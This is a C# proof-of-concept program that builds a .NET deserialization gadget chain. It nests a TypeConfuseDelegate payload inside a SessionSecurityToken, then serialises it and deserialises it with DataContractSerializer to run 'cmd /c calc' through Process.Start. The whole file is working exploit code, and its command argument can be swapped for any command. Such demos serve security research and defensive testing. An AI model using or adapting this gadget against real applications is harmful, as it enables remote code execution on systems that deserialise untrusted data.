using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IdentityModel.Tokens;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Security.Claims;

namespace Demo
{

    internal sealed class Program
    {

        #region Methods

        private static void Main(string[] args)
        {
            var gadget = SessionSecurityTokenGadget("calc");
            var serializer = new DataContractSerializer(gadget.GetType());

            using (var stream = new FileStream("gadget.dat", FileMode.Create, FileAccess.Write))
            {
                // serialize the object into the stream
                serializer.WriteObject(stream, gadget);
            }

            serializer = new DataContractSerializer(gadget.GetType());
            using (var stream = new FileStream("gadget.dat", FileMode.Open, FileAccess.Read))
            {
                // deserialize it and get code execution
                serializer.ReadObject(stream);
            }
        }

        #region Helpers
 
        private static SessionSecurityToken SessionSecurityTokenGadget(string cmd)
        {
            var id = new ClaimsIdentity();
            id.BootstrapContext = TypeConfuseDelegateGadget(cmd);
 
            var principal = new ClaimsPrincipal();
            principal.AddIdentity(id);
 
            return new SessionSecurityToken(principal);
        }

        private static SortedSet<string> TypeConfuseDelegateGadget(string cmd)
        {
            Delegate da = new Comparison<string>(string.Compare);
            var d = (Comparison<string>)Delegate.Combine(da, da);
            var comp = Comparer<string>.Create(d);
            var set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + cmd);

            var fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }
        
        #endregion

        #endregion

    }

}
